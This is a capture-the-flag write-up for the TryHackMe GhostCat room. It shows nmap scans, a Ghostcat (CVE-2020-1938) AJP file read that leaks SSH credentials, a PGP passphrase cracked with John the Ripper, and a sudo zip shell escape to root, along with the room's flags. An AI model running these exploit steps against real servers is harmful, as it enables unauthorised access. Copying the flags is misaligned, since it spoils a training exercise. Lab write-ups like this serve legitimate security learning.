**Are you able to complete the challenge?  
**The machine may take up to 5 minutes to boot and configure.

  

_Admins Note: This room contains inappropriate content in the form of a username that contains a swear word and should be noted for an educational setting. - Dark_


# 1
Compromise this machine and obtain user.txt

`nmap -sS $target -oG output.txt`

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-19 15:54 AEST
Nmap scan report for 10.10.92.234
Host is up (0.27s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
8009/tcp open  ajp13
8080/tcp open  http-proxy
```

`nmap -sS 10.10.92.234 -T 4 -sV --osscan-guess`

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
8080/tcp open  http       Apache Tomcat 9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


`dirb http://10.10.92.234:8080/ /usr/share/wordlists/dirb/common.txt`

`nmap -sU -T 4 10.10.92.234 -n`

`nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p 8009 10.10.92.234` demonstrates that Jserve is running

https://github.com/dacade/CVE-2020-1938

`python3 ./tomcat.py 10.10.92.234 -f /WEB-INF/web.xml -p 8009`

```
Getting resource at ajp13://10.10.92.234:8009/hissec
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
        skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>
```

We can now ssh as the user `skyfuck`


`uname -a`
`Linux ubuntu 4.4.0-174-generic #204-Ubuntu SMP Wed Jan 29 06:41:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux`

We can see we have a `credential.pgp` file and an `.asc` file

```
-rw------- 1 skyfuck skyfuck  136 Mar 10  2020 .bash_history
-rw-r--r-- 1 skyfuck skyfuck  220 Mar 10  2020 .bash_logout
-rw-r--r-- 1 skyfuck skyfuck 3771 Mar 10  2020 .bashrc
drwx------ 2 skyfuck skyfuck 4096 Feb 18 22:14 .cache
-rw-rw-r-- 1 skyfuck skyfuck  394 Mar 10  2020 credential.pgp
-rw-r--r-- 1 skyfuck skyfuck  655 Mar 10  2020 .profile
-rw-rw-r-- 1 skyfuck skyfuck 5144 Mar 10  2020 tryhackme.asc
```


Lets import the `.asc` file
`gpg --import tryhackme.asc`

Attempt to decrypt
`gpg --decrypt credential.pgp` fails asking for a passphrase.  The credentials for the user did not work.

Copy the files to our machine
Install `pgpdump` and check it
`pgpdump -g credential.pgp`
```
Old: Public-Key Encrypted Session Key Packet(tag 1)(270 bytes)
        New version(3)
        Key ID - 0x61E104A66184FBCC
        Pub alg - ElGamal Encrypt-Only(pub 16)
        ElGamal g^k mod p(1017 bits) - ...
        ElGamal m * y^k mod p(1021 bits) - ...
                -> m = sym alg(1 byte) + checksum(2 bytes) + PKCS-1 block type 02
New: Symmetrically Encrypted and MDC Packet(tag 18)(119 bytes)
        Ver 1
        Encrypted data [sym alg is specified in pub-key encrypted session key]
                (plain text + MDC SHA1(20 bytes))
```


import the asc
`gpg --import tryhackme.asc` without a passphrase
`gpg2john tryhackme.asc > hash`
`john --format=gpg --wordlist=rockyou.txt hash`
gives us the passphrase of `alexandru`

Back on the target, `gpg -d credential.pgp` using a passprase of `alexandru` we get a new credential
`merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j`

Looking at `/etc/passwd` this is an account.

We can logon and find the user flag

Answer: 
`THM{GhostCat_1s_so_cr4sy}`

# 2
Escalate privileges and obtain root.txt

`id` shows we are a member of a number of groups
`uid=1000(merlin) gid=1000(merlin) groups=1000(merlin),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)`

`sudo -l` shows we can run `/usr/bin/zip` as sudo.
GTFO bins shows sudo as zip.

```
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```

`cat /root/root.txt` gives us
`THM{Z1P_1S_FAKE}`

Answer: `THM{Z1P_1S_FAKE}`

